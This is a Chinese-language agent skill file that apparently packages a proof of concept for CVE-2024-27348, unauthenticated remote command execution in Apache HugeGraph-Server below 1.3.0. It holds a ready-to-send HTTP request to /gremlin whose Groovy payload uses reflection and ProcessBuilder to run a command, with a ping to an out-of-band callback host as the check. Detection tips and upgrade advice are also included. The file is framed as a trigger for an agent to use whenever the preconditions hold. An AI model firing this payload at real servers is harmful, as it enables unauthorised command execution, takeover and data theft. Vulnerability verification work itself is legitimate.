---
name: poc-apache-hugegraph-server-cve-2024-27348
description: 针对 CVE-2024-27348 的详细分析与 PoC 触发技能。当你具备Apache HugeGraph-Server版本低于1.3.0且gremlin组件可访问的前提条件时，使用此SKILL。
---
验证漏洞存在方法
    - 发送特定的gremlin查询到目标服务器的/gremlin端点，检查是否能够通过反射机制执行命令

漏洞利用方法
    - Apache HugeGraph-Server的gremlin组件存在远程命令执行漏洞，攻击者可以通过构造恶意的gremlin查询来执行任意系统命令
    - 使用反射机制修改线程名并执行ProcessBuilder命令，例如执行ping命令到交互式服务器进行验证
    
PoC示例：
```http
POST /gremlin HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
  "gremlin": "Thread thread = Thread.currentThread();Class clz = Class.forName(\\\"java.lang.Thread\\\");java.lang.reflect.Field field = clz.getDeclaredField(\\\"name\\\");field.setAccessible(true);field.set(thread, \\\"SL7\\\");Class processBuilderClass = Class.forName(\\\"java.lang.ProcessBuilder\\\");java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);java.util.List command = java.util.Arrays.asList(\\\"ping\\\", \\\"{{interactsh-url}}\\\");Object processBuilderInstance = constructor.newInstance(command);java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\\\"start\\\");startMethod.invoke(processBuilderInstance);",
  "bindings": {},
  "language": "gremlin-groovy",
  "aliases": {}
}
```

检测方法：
- 检查响应中是否包含"inputStream"字段
- 检查是否收到DNS交互请求
- 验证响应头是否为application/json类型

影响：
- 未经身份验证的攻击者可以执行任意命令
- 可能完全控制Apache HugeGraph-Server系统
- 可导致数据泄露、系统破坏等严重后果

修复建议：
- 升级到Apache HugeGraph-Server 1.3.0或更高版本
- 配置用户身份验证机制
- 限制对gremlin组件的访问权限